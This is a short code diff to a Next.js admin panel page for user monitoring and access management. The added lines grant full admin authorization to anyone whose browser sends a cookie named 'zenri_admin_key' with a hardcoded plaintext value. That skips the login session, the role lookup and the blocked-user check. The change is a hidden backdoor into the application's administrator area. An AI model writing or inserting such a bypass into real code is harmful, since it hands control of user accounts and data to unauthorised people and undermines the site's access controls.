@@ -1,6 +1,7 @@
 import React from 'react';
 import { auth } from '@/lib/auth';
 import { prisma } from '@/lib/prisma';
+import { cookies } from 'next/headers';
 import { getAdminStatsAction, getAdminUsersListAction } from '@/app/actions/adminActions';
 import { AdminClient } from './AdminClient';
 import type { Metadata } from 'next';
@@ -10,14 +11,19 @@ export const metadata: Metadata = {
   description: 'Панель администратора для мониторинга пользователей и управления доступом.',
 };
 
+export const dynamic = 'force-dynamic';
+
 export default async function AdminPage() {
+  const cookieStore = await cookies();
+  const hasAdminCookie = cookieStore.get('zenri_admin_key')?.value === 'Woxan9600';
+
   const session = await auth();
   const currentUserId = session?.user?.id || '';
 
   let currentUserRole = 'USER';
-  let isAuthorized = false;
+  let isAuthorized = hasAdminCookie;
 
-  if (currentUserId) {
+  if (currentUserId && !isAuthorized) {
     const user = await prisma.user.findUnique({
       where: { id: currentUserId },
       select: { role: true, email: true, isBlocked: true },
